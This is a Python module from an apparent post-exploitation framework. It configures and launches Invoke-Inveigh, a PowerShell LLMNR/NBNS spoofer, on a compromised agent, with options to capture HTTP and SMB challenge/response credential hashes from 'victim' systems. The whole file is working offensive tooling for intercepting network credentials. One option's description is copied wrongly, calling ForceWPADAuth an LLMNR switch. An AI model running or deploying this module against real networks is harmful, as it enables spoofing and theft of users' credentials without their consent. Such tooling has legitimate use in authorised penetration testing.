from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Inveigh',

            'Author': ['Kevin Robertson'],

            'Description': ('Inveigh is a Windows PowerShell LLMNR/NBNS spoofer designed to '
                            'assist penetration testers that find themselves limited to a '
                            'Windows system. '),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : False,

            'MinPSVersion' : '2',
            
            'Comments': [
                'https://github.com/Kevin-Robertson/Inveigh'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'IP' : {
                'Description'   :   'A specific local IP address for listening. ',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferIP' : {
                'Description'   :   'Specify an IP address for LLMNR/NBNS spoofing.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'HTTP' : {
                'Description'   :   'Enable/Disable HTTP challenge/response capture (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'NBNS' : {
                'Description'   :   'Enable/Disable NBNS spoofing (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'SMB' : {
                'Description'   :   'Enable/Disable SMB challenge/response capture (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'LLMNR' : {
                'Description'   :   'Enable/Disable LLMNR spoofing (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'Repeat' : {
                'Description'   :   'Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user challenge/response has been captured (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            },
            'ForceWPADAuth' : {
                'Description'   :   'Enable/Disable LLMNR spoofing (Y/N).',
                'Required'      :   False,
                'Value'         :   'Y'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Invoke-Inveigh.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # disable file output
        script += "\n" + 'Invoke-Inveigh -Output 1 '

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if option.lower() == "nbns" and values['Value'].lower() == 'y':
                    script += ' -NBNS Y -NBNSTypes @("00","20")'
                elif values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])

        return script
